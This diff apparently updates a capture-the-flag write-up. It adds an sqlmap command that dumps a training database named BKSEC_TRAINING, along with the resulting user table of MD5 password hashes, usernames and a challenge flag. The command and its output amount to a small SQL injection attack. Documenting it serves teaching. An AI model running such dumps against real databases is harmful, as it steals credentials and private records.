@@ -105,7 +105,18 @@ available databases [6]:
 
 **Dump the suspicious database:**
 ```bash
+sqlmap -r request.txt -D BKSEC_TRAINING --dump --batch
 
+Database: BKSEC_TRAINING                                                                                                                                                                                                                  
+Table: user_info
+[31 entries]
++----+--------------------------------------------------+--------------------------+----------------------------------------------------------------+
+| id | pwd                                              | uname                    | name                                                           |
++----+--------------------------------------------------+--------------------------+----------------------------------------------------------------+
+| 1  | 521b04082eb661f55a5152dfdfce3844                 | teebow1e                 | BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1} |
+| 2  | 8a7148dfee42902f881086ce7249dd2b (slop)          | slop                     | slop                                                           |
+| 3  | 21232f297a57a5a743894a0e4a801fc3 (admin)         | admin                    | admin                                                          |
+| 4  | 327a6c4304ad5938eaf0efb6cc3e53dc (flag)          | flag                     | flag                                                           |
 ```
 
 ---
